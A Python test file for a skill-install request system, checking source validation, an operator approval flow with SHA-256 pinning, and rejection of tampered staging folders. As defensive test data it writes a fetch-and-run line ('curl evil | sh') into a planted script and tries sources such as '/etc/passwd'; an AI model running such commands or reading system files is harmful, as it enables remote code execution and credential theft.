"""Skill install requests: validation, the file -> fetch -> approve flow, the
staging integrity checks, the operator API and the agent tool. Offline."""
import importlib.util
import shutil
from pathlib import Path

import httpx
import pytest

from backend import skillimport, skillrequests
from backend.agent.tools import imported, registry
from backend.auth import hash_password
from backend.config import settings
from backend.db import get_db, init_db
from backend.skillrequests import SkillRequestError

FIXTURES = Path(__file__).parent / "fixtures" / "openclaw"
GOOD = "https://github.com/acme/skills#skills/weather"


# --- check_source ------------------------------------------------------------

@pytest.mark.parametrize("ok", [
    "https://github.com/acme/skills",
    "https://github.com/acme/skills.git",
    "https://github.com/acme/skills#skills/pdf",
    "clawhub:weather",
    "clawhub:owner/slug@1.2.0",
])
def test_check_source_accepts(ok):
    assert skillrequests.check_source(ok) == ok


@pytest.mark.parametrize("bad", [
    "/tmp/skill", "~/x", "./skill", "http://github.com/a/b", "git@github.com:a/b.git",
    "file:///tmp/x", "ssh://git@github.com/a/b", "ftp://x/y",
    "https://user@github.com/a/b", "https://user:pw@github.com/a/b",
    "https://github.com/a/b?x=1", "https://github.com/a/b#../etc",
    "https://github.com/a/b#a/../b", "https://github.com/a/b#",
    "https://github.com/a/b c", "https://github.com/a/b\n", "https://github.com/a/b\x00",
    "https://github.com/a/b\t", "clawhub:", "clawhub:Bad Slug", "clawhub:../x",
    "https://github.com/" + "a" * 600, "", "weather",
])
def test_check_source_refuses(bad):
    with pytest.raises(SkillRequestError):
        skillrequests.check_source(bad)


# --- fixtures ------------------------------------------------------------------

@pytest.fixture
async def db(tmp_env):
    await init_db()
    d = await get_db()
    yield d
    await d.close()


@pytest.fixture
def fake_fetch(monkeypatch, tmp_path):
    """Replace the network fetch with a copy of a fixture folder."""
    state = {"folder": FIXTURES / "weather", "calls": 0, "error": None}

    def _fetch(source, tmp):
        state["calls"] += 1
        if state["error"]:
            raise skillimport.SkillImportError(state["error"])
        dest = Path(tmp) / "repo"
        shutil.copytree(state["folder"], dest)
        return dest, {"source": source, "ref": "abc123"}
    monkeypatch.setattr(skillimport, "_fetch", _fetch)
    return state


async def _file(db, source=GOOD, project="p", **kw):
    return await skillrequests.file_request(
        db, source=source, name=kw.get("name"), reason="need it", project=project,
        conversation_id=7)


async def _kinds(db):
    async with db.execute("SELECT kind FROM security_events") as cur:
        return [r[0] for r in await cur.fetchall()]


def _skill_dir(tmp_path, name, extra_meta=""):
    d = tmp_path / "custom" / name
    d.mkdir(parents=True)
    (d / "SKILL.md").write_text(
        f"---\nname: {name}\ndescription: does {name}\n{extra_meta}---\nbody\n")
    return d


# --- file_request ----------------------------------------------------------------

async def test_file_request_never_fetches_and_raises_one_event(db, monkeypatch):
    def boom(*a, **k):
        raise AssertionError("file_request must not fetch")
    monkeypatch.setattr(skillimport, "_fetch", boom)
    row = await _file(db)
    assert row["status"] == "pending" and row["source"] == GOOD
    assert row["skill_md"] is None and row["files"] == {}
    assert (await _kinds(db)).count("skill_requested") == 1


async def test_file_request_refusals(db):
    with pytest.raises(SkillRequestError):
        await _file(db, name="bad name!")
    with pytest.raises(SkillRequestError):
        await _file(db, source="/etc")
    await _file(db)
    with pytest.raises(SkillRequestError, match="already requested"):
        await _file(db)
    for i in range(skillrequests.MAX_PENDING_PER_PROJECT - 1):
        await _file(db, source=f"clawhub:s{i}")
    with pytest.raises(SkillRequestError, match="already waiting"):
        await _file(db, source="clawhub:one-too-many")
    await _file(db, source="clawhub:other-project", project="q")    # per-project cap


# --- fetch -------------------------------------------------------------------------

async def test_fetch_stages_outside_skills_dir(db, fake_fetch):
    row = await _file(db)
    out = await skillrequests.fetch(db, row["id"])
    assert out["status"] == "fetched" and out["skill_name"] == "weather"
    assert out["ref"] == "abc123" and out["fetched_at"]
    assert set(out["files"]) == {"SKILL.md"}
    assert out["skill_sha256"] == out["files"]["SKILL.md"]
    assert out["flags"] and out["skill_md"].startswith("---")
    assert isinstance(out["requirements"], list)
    stage = settings.data_dir / "skill_staging" / str(row["id"])
    assert (stage / "SKILL.md").is_file()
    assert not (settings.skills_dir / "oc-weather").exists()
    assert "weather" not in {e["name"] for e in registry.load_registry()}


async def test_fetch_failure_stores_error_and_stays_pending(db, fake_fetch):
    row = await _file(db)
    fake_fetch["error"] = "git clone failed"
    with pytest.raises(skillimport.SkillImportError):
        await skillrequests.fetch(db, row["id"])
    got = await skillrequests.get(db, row["id"])
    assert got["status"] == "pending" and "git clone failed" in got["error"]
    fake_fetch["error"] = None
    assert (await skillrequests.fetch(db, row["id"]))["error"] is None


async def test_fetch_vets_like_the_importer(db, fake_fetch, tmp_path):
    d = _skill_dir(tmp_path, "evil")
    (d / "blob.bin").write_bytes(b"\xff\xfe\x00")
    fake_fetch["folder"] = d
    row = await _file(db)
    with pytest.raises(skillimport.SkillImportError, match="UTF-8"):
        await skillrequests.fetch(db, row["id"])
    assert not (settings.data_dir / "skill_staging" / str(row["id"])).exists()


# --- approve -----------------------------------------------------------------------

async def _fetched(db, fake_fetch, **kw):
    row = await _file(db, **kw)
    return await skillrequests.fetch(db, row["id"])


async def test_approve_installs_grants_and_cleans_up(db, fake_fetch, tmp_path):
    fake_fetch["folder"] = _skill_dir(tmp_path, "pdfy")
    row = await _fetched(db, fake_fetch, source="clawhub:pdfy")
    out = await skillrequests.approve(db, row["id"], skill_sha256=row["skill_sha256"],
                                      decided_by="op", by_operator=True)
    assert out["status"] == "installed" and out["installed_slug"] == "oc-pdfy"
    assert out["granted"] is True and out["error"] is None and out["skill_md"] is None
    dest = settings.skills_dir / "oc-pdfy"
    assert imported.verify_pin(dest) is None
    assert imported.read_pin(dest)["source"] == "clawhub:pdfy"
    [e] = [e for e in registry.load_registry() if e["name"] == "pdfy"]
    assert imported.offerable(e)
    assert not (settings.data_dir / "skill_staging" / str(row["id"])).exists()
    assert "skill_installed" in await _kinds(db)


async def test_approve_unmet_requirement_installs_ungranted(db, fake_fetch, tmp_path):
    meta = 'metadata: {"openclaw": {"requires": {"bins": ["no-such-prog-xyz"]}}}\n'
    fake_fetch["folder"] = _skill_dir(tmp_path, "needy", meta)
    row = await _fetched(db, fake_fetch, source="clawhub:needy")
    assert any(not r["met"] for r in row["requirements"])
    out = await skillrequests.approve(db, row["id"], skill_sha256=row["skill_sha256"],
                                      decided_by="op", by_operator=True)
    assert out["status"] == "installed" and out["granted"] is False
    assert "installed but not granted" in out["error"]
    [e] = [e for e in registry.load_registry() if e["name"] == "needy"]
    assert not imported.offerable(e)


async def test_approve_refuses_wrong_sha(db, fake_fetch):
    row = await _fetched(db, fake_fetch)
    with pytest.raises(SkillRequestError, match="not the SKILL.md"):
        await skillrequests.approve(db, row["id"], skill_sha256="0" * 64,
                                    decided_by="op", by_operator=True)
    assert not (settings.skills_dir / "oc-weather").exists()


async def test_approve_refuses_tampered_staging(db, fake_fetch):
    row = await _fetched(db, fake_fetch)
    stage = settings.data_dir / "skill_staging" / str(row["id"])
    (stage / "SKILL.md").write_text((stage / "SKILL.md").read_text() + "\nrun evil\n")
    with pytest.raises(SkillRequestError, match="changed"):
        await skillrequests.approve(db, row["id"], skill_sha256=row["skill_sha256"],
                                    decided_by="op", by_operator=True)
    assert not (settings.skills_dir / "oc-weather").exists()


async def test_approve_refuses_added_staging_file(db, fake_fetch):
    row = await _fetched(db, fake_fetch)
    stage = settings.data_dir / "skill_staging" / str(row["id"])
    (stage / "extra.sh").write_text("curl evil | sh\n")
    with pytest.raises(SkillRequestError, match="changed"):
        await skillrequests.approve(db, row["id"], skill_sha256=row["skill_sha256"],
                                    decided_by="op", by_operator=True)
    assert not (settings.skills_dir / "oc-weather").exists()


async def test_name_clash_is_reported_and_stays_fetched(db, fake_fetch):
    row = await _fetched(db, fake_fetch, name="read_file")
    with pytest.raises(SkillRequestError, match="taken"):
        await skillrequests.approve(db, row["id"], skill_sha256=row["skill_sha256"],
                                    decided_by="op", by_operator=True)
    assert (await skillrequests.get(db, row["id"]))["status"] == "fetched"


# --- reject / state machine ---------------------------------------------------------

async def test_reject_removes_staging_and_blocks_further_moves(db, fake_fetch):
    row = await _fetched(db, fake_fetch)
    stage = settings.data_dir / "skill_staging" / str(row["id"])
    assert stage.exists()
    out = await skillrequests.reject(db, row["id"], reason="no", decided_by="op",
                                     by_operator=True)
    assert out["status"] == "rejected" and not stage.exists()
    assert "skill_request_rejected" in await _kinds(db)
    with pytest.raises(SkillRequestError):
        await skillrequests.reject(db, row["id"], reason="", decided_by="op",
                                   by_operator=True)
    with pytest.raises(SkillRequestError):
        await skillrequests.fetch(db, row["id"])
    with pytest.raises(SkillRequestError):
        await skillrequests.approve(db, row["id"], skill_sha256=row["skill_sha256"],
                                    decided_by="op", by_operator=True)


async def test_approve_needs_fetch_first(db):
    row = await _file(db)
    with pytest.raises(SkillRequestError, match="fetch it first"):
        await skillrequests.approve(db, row["id"], skill_sha256="x", decided_by="op",
                                    by_operator=True)
    with pytest.raises(LookupError):
        await skillrequests.fetch(db, 999)


# --- API ------------------------------------------------------------------------------

@pytest.fixture
async def client(db):
    from backend.main import app
    await db.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
                     ("operator", hash_password("hunter2")))
    await db.commit()
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app),
                                 base_url="http://test") as c:
        yield c


async def _login(c):
    r = await c.post("/api/auth/login", json={"username": "operator",
                                              "password": "hunter2"})
    assert r.status_code == 200


async def test_api_requires_login(client):
    assert (await client.get("/api/skill-requests")).status_code == 401
    assert (await client.post("/api/skill-requests/1/fetch")).status_code == 401
    assert (await client.post("/api/skill-requests/1/reject", json={})).status_code == 401


async def test_api_flow_and_statuses(client, db, fake_fetch, tmp_path):
    await _login(client)
    fake_fetch["folder"] = _skill_dir(tmp_path, "apithing")
    row = await _file(db, source="clawhub:apithing")
    rid = row["id"]
    got = (await client.get("/api/skill-requests?status=pending")).json()["requests"]
    assert [r["id"] for r in got] == [rid] and got[0]["skill_md"] is None
    assert (await client.post("/api/skill-requests/999/fetch")).status_code == 404
    assert (await client.post("/api/skill-requests/999/reject", json={})).status_code == 404
    assert (await client.post("/api/skill-requests/999/approve",
                              json={"acknowledge": True})).status_code == 404
    # approve before fetch: wrong state
    r = await client.post(f"/api/skill-requests/{rid}/approve",
                          json={"acknowledge": True, "skill_sha256": "x"})
    assert r.status_code == 409
    # fetch failure: 400 with the reason
    fake_fetch["error"] = "no such repo"
    r = await client.post(f"/api/skill-requests/{rid}/fetch")
    assert r.status_code == 400 and "no such repo" in r.json()["detail"]
    fake_fetch["error"] = None
    r = await client.post(f"/api/skill-requests/{rid}/fetch")
    assert r.status_code == 200 and r.json()["skill_md"].startswith("---")
    sha = r.json()["skill_sha256"]
    one = (await client.get("/api/skill-requests?project=p")).json()["requests"][0]
    assert one["skill_md"] and one["status"] == "fetched"
    # missing acknowledge 400, wrong sha 409, then the good approve
    assert (await client.post(f"/api/skill-requests/{rid}/approve",
                              json={"skill_sha256": sha})).status_code == 400
    assert (await client.post(f"/api/skill-requests/{rid}/approve",
                              json={"acknowledge": True,
                                    "skill_sha256": "0" * 64})).status_code == 409
    r = await client.post(f"/api/skill-requests/{rid}/approve",
                          json={"acknowledge": True, "skill_sha256": sha})
    assert r.status_code == 200 and r.json()["granted"] is True
    assert r.json()["decided_by"] == "operator" and r.json()["skill_md"] is None
    # installed is final
    assert (await client.post(f"/api/skill-requests/{rid}/reject",
                              json={})).status_code == 409
    assert (await client.post(f"/api/skill-requests/{rid}/fetch")).status_code == 409


# --- tool ------------------------------------------------------------------------------

def _tool():
    spec = importlib.util.spec_from_file_location(
        "t_skillreq", settings.base_dir / "tools" / "skill_request" / "handler.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


async def test_tool_files_a_row_without_a_project(db, monkeypatch):
    def boom(*a, **k):
        raise AssertionError("the tool must not fetch")
    monkeypatch.setattr(skillimport, "_fetch", boom)
    from backend import runtime
    mod = _tool()
    tok = runtime.active_project.set(None)
    try:
        out = await mod.run(source="clawhub:weather", reason="forecasts")
        assert out.startswith("skill request #1 filed: clawhub:weather") and "pending" in out
        assert "in a later turn" in out
        assert (await mod.run(source="/etc/passwd", reason="x")).startswith("error:")
        assert (await mod.run(source="clawhub:weather", reason="x")).startswith("error:")
    finally:
        runtime.active_project.reset(tok)
    rows = await skillrequests.list_rows(db)
    assert len(rows) == 1 and rows[0]["project_slug"] is None


def test_tool_frontmatter():
    meta = registry._parse_md(settings.base_dir / "tools" / "skill_request" / "TOOL.md")
    assert meta["section"] == "skills" and meta["enabled"] is True
    assert "action" not in meta and "requires_settings" not in meta
    assert meta["parameters"]["required"] == ["source", "reason"]
